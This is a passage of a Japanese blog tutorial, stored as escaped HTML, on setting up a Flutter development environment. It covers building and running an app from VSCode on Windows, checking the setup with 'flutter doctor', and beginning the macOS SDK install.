&lt;h3 id=&quot;アプリケーションをビルドする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E3%83%93%E3%83%AB%E3%83%89%E3%81%99%E3%82%8B&quot; aria-label=&quot;アプリケーションをビルドする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;アプリケーションをビルドする&lt;/h3&gt;
&lt;p&gt;プロジェクトが完成したら、F5キーを押すと自動でアプリケーションがビルドされます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/01601657b1455bb8465bf8d718ac01ef/33a7b/image-20220308222156823.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 53.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABuklEQVQoz21SWa6jMBDkIAHvBrMGsQTQS4aQyZPmZ+5/m5q28zIKEh8lN8Zdrq5ytGxP3G43PB4PPJ9PrOuKeVlwvV4JX5jmBV3XB/T9gGEcw7/7tmHbHrjfV3x//8av9Y5+GBENQ4eu7wOpb6jrBsamKJszXF7AGYXcOZRFAWsMpBAQXIQzxlhYa+AcrZkDFxLRNE/UUCBNM0ipwiGlFDjVOitR0+HC6kCcaQUrBThnOJ1OiAmnD8RxjOj252+4TWsdyDwEqWCMo24qnNsWiaU9uuTVGIfGJEkOEY3ThWRnRGg+CCWp4BBSggWQYiJktMcERxIngfRN/K6Dwss0EmG6I5TSE9JoxkG1NUxVw9YVVFnAnM8wWUaXiUOl0bxMO0KtbfDSK9QURFblEJqTQgpDS0jyUhoZ9t7qdoQ+lD2heYVCo5miRNMNcEMLQ0qlT9mkYNTovTz00I+cfnj4ItQhGMElXNMibXJ6Rjm0IlUsphfAKCS+8+6/h+NlPBz5lTSjURMaj1Ya0Y+prCCVHhzSW/FD7sHoOZGH86FCH0ySMKiUVLYGaaVhS4W0ppVqk//Ufo++fa2dxD8xlD86WiTt7gAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/01601657b1455bb8465bf8d718ac01ef/8ac56/image-20220308222156823.webp 240w,
/static/01601657b1455bb8465bf8d718ac01ef/d3be9/image-20220308222156823.webp 480w,
/static/01601657b1455bb8465bf8d718ac01ef/e46b2/image-20220308222156823.webp 960w,
/static/01601657b1455bb8465bf8d718ac01ef/03b0b/image-20220308222156823.webp 1119w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/01601657b1455bb8465bf8d718ac01ef/8ff5a/image-20220308222156823.png 240w,
/static/01601657b1455bb8465bf8d718ac01ef/e85cb/image-20220308222156823.png 480w,
/static/01601657b1455bb8465bf8d718ac01ef/d9199/image-20220308222156823.png 960w,
/static/01601657b1455bb8465bf8d718ac01ef/33a7b/image-20220308222156823.png 1119w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/01601657b1455bb8465bf8d718ac01ef/d9199/image-20220308222156823.png&quot;
            alt=&quot;image-20220308222156823&quot;
            title=&quot;image-20220308222156823&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;デフォルトではDevToolが設定されており、何やらこんな感じのデスクトップアプリのUIを操作することができます。&lt;/p&gt;
&lt;span class=&quot;gatsby-resp-image-wrapper&quot; style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 750px; &quot;&gt;
      &lt;a class=&quot;gatsby-resp-image-link&quot; href=&quot;/static/c6bb7de6f3815ff88ca3da6a22a265ec/1d69c/image-20220308222254153.png&quot; style=&quot;display: block&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
    &lt;span class=&quot;gatsby-resp-image-background-image&quot; style=&quot;padding-bottom: 96.25000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAABeUlEQVQ4y62Uy0rDQBhG8wpF97oTcaPv4s7X8AlcuKyCbhR0LYJYRBC1booFUbuwhaJoL4rB2pr7bTJp+jkTSYltQmts4DAXZg7fzD9EOCpLOH7oIFf+wmXNQb5GWEuC9qo+BmzP2ZOJm4qI0/sKhLmtTyzuW1jY1TG/88PSno6ZbQ2ZrIapDUY2memsisymgdn1VyyvHULIV9soNi1c1w2GGVBsmMG4MC41HYU3H+e3JQiepQHoMmh6ei741+o0IMiKCpd6cIibGtsh6LJM9fdnCJqmwfM8uK6bGuIS9HygITKhGhFSSlORKIxKR6WKrvktVNWhhGGfz3PiUkXXJwqji2zbDrAsq98PcRxnvIRRKS+WLMtQFAXtdhuSJIGv5WPDMGKFTfEl+cjhcbvsPfBUfI73w/m4Iw8J4y48qVB/Sjh48YOSpGczUjiKcM/khYTAD6r8T2G/gJQEPwfxYwIJfY+ipTlYOaE4uHucjLCj21i9MJErVfENerKgASvJxzEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;&gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source srcset=&quot;/static/c6bb7de6f3815ff88ca3da6a22a265ec/8ac56/image-20220308222254153.webp 240w,
/static/c6bb7de6f3815ff88ca3da6a22a265ec/d3be9/image-20220308222254153.webp 480w,
/static/c6bb7de6f3815ff88ca3da6a22a265ec/08b4d/image-20220308222254153.webp 750w&quot; sizes=&quot;(max-width: 750px) 100vw, 750px&quot; type=&quot;image/webp&quot;&gt;
          &lt;source srcset=&quot;/static/c6bb7de6f3815ff88ca3da6a22a265ec/8ff5a/image-20220308222254153.png 240w,
/static/c6bb7de6f3815ff88ca3da6a22a265ec/e85cb/image-20220308222254153.png 480w,
/static/c6bb7de6f3815ff88ca3da6a22a265ec/1d69c/image-20220308222254153.png 750w&quot; sizes=&quot;(max-width: 750px) 100vw, 750px&quot; type=&quot;image/png&quot;&gt;
          &lt;img class=&quot;gatsby-resp-image-image&quot; src=&quot;/static/c6bb7de6f3815ff88ca3da6a22a265ec/1d69c/image-20220308222254153.png&quot; alt=&quot;image-20220308222254153&quot; title=&quot;image-20220308222254153&quot; loading=&quot;lazy&quot; style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;
&lt;p&gt;また、VSCodeの右下のデバイス名をクリックし、ビルド時のエミュレータをブラウザやAndroidエミュレータに変更することができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 742px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/a281b9d1ed97f2b8aa70ba5475bd688e/0f2bc/image-20220308222525632.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 31.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABA0lEQVQY043PPUvFMBgF4P4LRUT7laQ2SW3TNibp7cctDqI4iOKgLg4ud/D/b8e0F0EELw4PJ8N5kzeB0gbDNKOftujHLVw/Qhu3ahdX9m9rx6LxZ207iLJGwOYn1M+fyO8/kNy843h6/Zej8QUn8xuqx91KPuxwau4QSKWxub6FchNo0SDKS5xRuTpnEmFWHBRlAhHzMt9PLxAIzuGsgTMGum2gqhIizyGFAPdJ0xSUkH3+RhmY0GB5BcZrJHHiN5QFnOswDCO6TQ9r3appNVTd4LKsIESBlFAQwrwfSTMQfxnxv6JcIU4IAuJfz5eNpPSDe5wLhGHoRYii+DDf+7bMfAE427r9gNAQhAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/a281b9d1ed97f2b8aa70ba5475bd688e/8ac56/image-20220308222525632.webp 240w,
/static/a281b9d1ed97f2b8aa70ba5475bd688e/d3be9/image-20220308222525632.webp 480w,
/static/a281b9d1ed97f2b8aa70ba5475bd688e/28367/image-20220308222525632.webp 742w&quot;
              sizes=&quot;(max-width: 742px) 100vw, 742px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/a281b9d1ed97f2b8aa70ba5475bd688e/8ff5a/image-20220308222525632.png 240w,
/static/a281b9d1ed97f2b8aa70ba5475bd688e/e85cb/image-20220308222525632.png 480w,
/static/a281b9d1ed97f2b8aa70ba5475bd688e/0f2bc/image-20220308222525632.png 742w&quot;
            sizes=&quot;(max-width: 742px) 100vw, 742px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/a281b9d1ed97f2b8aa70ba5475bd688e/0f2bc/image-20220308222525632.png&quot;
            alt=&quot;image-20220308222525632&quot;
            title=&quot;image-20220308222525632&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Androidエミュレータを使用する場合は事前にAndroid StudioかVisual Studioを使ってAndroidエミュレータをインストールしておく必要があります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://developer.android.com/studio/install?hl=ja&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Android Studio のインストール  |  Android デベロッパー  |  Android Developers&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;これでWindowsマシン上でFlutter環境を構築してAndroidアプリを動かすことができました。&lt;/p&gt;
&lt;p&gt;ここまでの所用時間は10分程度と、非常に簡単にセットアップすることができました。&lt;/p&gt;
&lt;span class=&quot;gatsby-resp-image-wrapper&quot; style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 624px; &quot;&gt;
      &lt;a class=&quot;gatsby-resp-image-link&quot; href=&quot;/static/c8b9afc88851aeb176787757b557b330/39c09/image-20220308222837488.png&quot; style=&quot;display: block&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
    &lt;span class=&quot;gatsby-resp-image-background-image&quot; style=&quot;padding-bottom: 186.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAlCAYAAABCr8kFAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEgklEQVRIx62W21NbVRTGT2kpJSRAgYBAICQ5uVgEtKShKJdipYg+OKOPWi9/gSQhNEJIUulUkZt10E7bqcNVi8A446jjjM8++oDWhz7hTLkWIRpyT8Pn3juccMpQCoUz881aa5+dX9bae+1kc/XnGvCs3gBZSjJkJ47jZJoEmZJUEh9H+okUnJRKmJUcO4rUY0lIPsLhKMch6UgS0iRpSE/PgNvtBn2+vD4I7uyZSmTmKiDVvYQ0/iwyDLVI19cQvxoy7YskrkE6eSclcaqmGrmlNVBWvgxeV4H8Ii2SklPg7OxEOBrDtcHPwZ0+/ybKu35Dtvsu5K4ZZDtnkENswifKInrG/Qfy3DMwfPYXGm79jVcHfkfL5THoTc2wX2pDJAb0D/SDK3vnY5jGgdcn/KgdDaDpTpDZhvEAzn8TxDlimyeCKL/th2LQj6JBHwqueSEfDKHiiwcw1b2PdruNldzfT4DGtx2oH/XhjW89uDDqwWvjHjQS2zTmQTPxXxnx4K2Jf1E/5MHzN9ZQeYvKA+ONFVSSREo+uA5Hm3kLaG/vxMp6GPdXvFhYXcc8kWAF//4/61hcW8cDjw/LHmpJvPofQqTMr25+DYvFgigB9vT2gnO74jsUi4ax8TBCFH2sYiJFwyH2udGREZjNFmwQv6+vD5yLADc2NhAKhRAKh/esQCDIgENDw2ghQH/kIXop0EkzJPgwmUQViUSeKDovGIwDh4eH4bRfgscfQk8PKdnZ6WIvaIZPAxwdHkGfy8H8gYEBcA6H40DAEQK86mhnPlvDjo6OAwFpyVZr6yaQto3dfmBga2vrVh/abLZDA7KSrVbrwYCkbdpsbVubQrtcDNyrxBmaW+JHr7u7m2Ro2cpwL9kJEoBTk1MoKSmByWSCwWAgGZrjGdIJgiic2kAgkPC3i76jz/T0NOQ5chQUFKCwsHAL6Pf7sby8jIWFBSwuLmJ+fp5pbm6OiY4tLS2x93Tc6/XGgVPTyM3NhUqlQnFx8ZPXcHZ2ln2ZsBnb11AAKpXKTaB5912msJ3GHwHKxUCLddcMxa3yuAzlYuBOfbgTSDy+K3D7Gu63sdkuEyBtncMDkrahsKKiooMfPVoy7UGe17CyE334tEB6UvTk5mE0noFOrz+EkkmG+Xl50KpVUO13DcW77PNvZjg1BXVBPowGHUpJ2fvOUJiDWBw4SUrmFYUo1/Eo49X7W0Nxht/96cPdNeCH76dRnJ+PCgJ8jgJbPmxBLBaDz+djvyC7ad3nB6IB/HrPC8knq2iajGJo7A5UpOQX9FqUa0nJH23+p+znWSMVv/tjGDfvAb/8/BOysnOgKFaiUEH6sLHxAlwuF+jfqdPpZH4nue8J6urqYuNCTP1Pr15Bh70NVy478d7Fi6yhlWSH2UnJypKDIzdSqhx5DmQyWSKmqqqqeiSmqq2rS/j0JqvRaKBQKOJA7SkjMjMyIUmVQCaVMUnTpAmJY3oFlkriPp1PxY4dOSE0SwZUl1bjVNlp6HV68BoeWl4LrVYXF/F5Gm8bE2K1Ss0gYv0P2jX7NBL/XXEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;&gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source srcset=&quot;/static/c8b9afc88851aeb176787757b557b330/8ac56/image-20220308222837488.webp 240w,
/static/c8b9afc88851aeb176787757b557b330/d3be9/image-20220308222837488.webp 480w,
/static/c8b9afc88851aeb176787757b557b330/b5732/image-20220308222837488.webp 624w&quot; sizes=&quot;(max-width: 624px) 100vw, 624px&quot; type=&quot;image/webp&quot;&gt;
          &lt;source srcset=&quot;/static/c8b9afc88851aeb176787757b557b330/8ff5a/image-20220308222837488.png 240w,
/static/c8b9afc88851aeb176787757b557b330/e85cb/image-20220308222837488.png 480w,
/static/c8b9afc88851aeb176787757b557b330/39c09/image-20220308222837488.png 624w&quot; sizes=&quot;(max-width: 624px) 100vw, 624px&quot; type=&quot;image/png&quot;&gt;
          &lt;img class=&quot;gatsby-resp-image-image&quot; src=&quot;/static/c8b9afc88851aeb176787757b557b330/39c09/image-20220308222837488.png&quot; alt=&quot;image-20220308222837488&quot; title=&quot;image-20220308222837488&quot; loading=&quot;lazy&quot; style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;
&lt;h3 id=&quot;構成を確認する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E6%A7%8B%E6%88%90%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot; aria-label=&quot;構成を確認する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;構成を確認する&lt;/h3&gt;
&lt;p&gt;Powershellなどで&lt;code class=&quot;language-text&quot;&gt;flutter doctor&lt;/code&gt;コマンドを実行することで、環境設定の診断を行うことができます。&lt;/p&gt;
&lt;p&gt;すべてのセットアップが完了している場合、以下のように&lt;code class=&quot;language-text&quot;&gt;No issues found!&lt;/code&gt;と出力されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;flutter doctor
Running &lt;span class=&quot;token string&quot;&gt;&quot;flutter pub get&quot;&lt;/span&gt; in flutter_tools&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;                       7&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;9s
Doctor summary &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;to see all details&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; run flutter doctor &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;v&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;:
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;✓&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Flutter &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Channel stable&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 2&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;10&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;3&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; on Microsoft Windows &lt;span class=&quot;token namespace&quot;&gt;[Version 10.0.19044.1526]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; locale ja-JP&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;✓&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Android toolchain &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; develop &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; Android devices &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Android SDK version 31&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;0&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;✓&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Chrome &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; develop &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; the web
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;✓&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Visual Studio &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; develop &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; Windows &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Visual Studio Community 2019 16&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;11&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;10&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;✓&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Android Studio &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;version 2021&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;✓&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; VS Code &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;version 1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;65&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;✓&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; Connected device &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;3 available&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;✓&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; HTTP Host Availability

• No issues found!&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;macosでflutterの開発環境をつくる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#macos%E3%81%A7flutter%E3%81%AE%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83%E3%82%92%E3%81%A4%E3%81%8F%E3%82%8B&quot; aria-label=&quot;macosでflutterの開発環境をつくる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;MacOSでFlutterの開発環境をつくる&lt;/h2&gt;
&lt;p&gt;基本的にはWindowsマシンの手順と同じです。&lt;/p&gt;
&lt;h3 id=&quot;fluttersdkをインストールする-1&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#fluttersdk%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B-1&quot; aria-label=&quot;fluttersdkをインストールする 1 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;FlutterSDKをインストールする&lt;/h3&gt;
&lt;p&gt;MacOSでもFlutterの開発環境を構築していきます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.flutter.dev/get-started/install/macos&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;macOS install | Flutter&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;まずはWindowsマシン同様&lt;a href=&quot;https://docs.flutter.dev/get-started/install/macos&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;macOS install | Flutter&lt;/a&gt;からSDKをダウンロードして、解凍し、PATHを通します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 398px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/ee7edf56a4fff1f833c5e8ad74141980/692d4/image-20220308223445666.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 45.833333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABT0lEQVQoz43Q2U7CQBiG4d6AipJY2+kCKhSooXSj1LQ0tKyBaEI8cQnRmHjgypV5Ax54Xxrz2ZkoMajAwZPOTDtv/pSzstc42LqCnrnE4eYNWtu3aPHUHRPz90zCP6DNPzJd/gk9for+zhQjYYrO2gQvz694/3gDp2fPcVxu4zQIUU9CVPUAViGAqYWwmCZsqtSEU4pQr7TmxOm7CEeDMS7OJuBK2TF6loOT2EEwasCPAvheA57nwbEdxk6ZpgmjaqBY1KBpv+3m9qHKeXBaZgg/jNDuD9GN+/BcD67rombUYBgGQ2O6rqNSrkAURIgimSNCkkhKAlfIDFgkSeJUgiBIJ/R9FrUsK53OZhPSNQ0LgsAu/ofb2+hAlhW2oU9VVaEoygzdf5/JsgxCyOJgfj2GRCT24SropZ/rv4OSPPsHyyydMPcVJDRIpJWii3wC1RUNQkQ/IuAAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/ee7edf56a4fff1f833c5e8ad74141980/8ac56/image-20220308223445666.webp 240w,
/static/ee7edf56a4fff1f833c5e8ad74141980/579c2/image-20220308223445666.webp 398w&quot;
              sizes=&quot;(max-width: 398px) 100vw, 398px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/ee7edf56a4fff1f833c5e8ad74141980/8ff5a/image-20220308223445666.png 240w,
/static/ee7edf56a4fff1f833c5e8ad74141980/692d4/image-20220308223445666.png 398w&quot;
            sizes=&quot;(max-width: 398px) 100vw, 398px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/ee7edf56a4fff1f833c5e8ad74141980/692d4/image-20220308223445666.png&quot;
            alt=&quot;image-20220308223445666&quot;
            title=&quot;image-20220308223445666&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;僕の環境ではシェルはzshだったので、&lt;code class=&quot;language-text&quot;&gt;~/.zshrc&lt;/code&gt;に以下のコマンドを書き込みました。&lt;/p&gt;
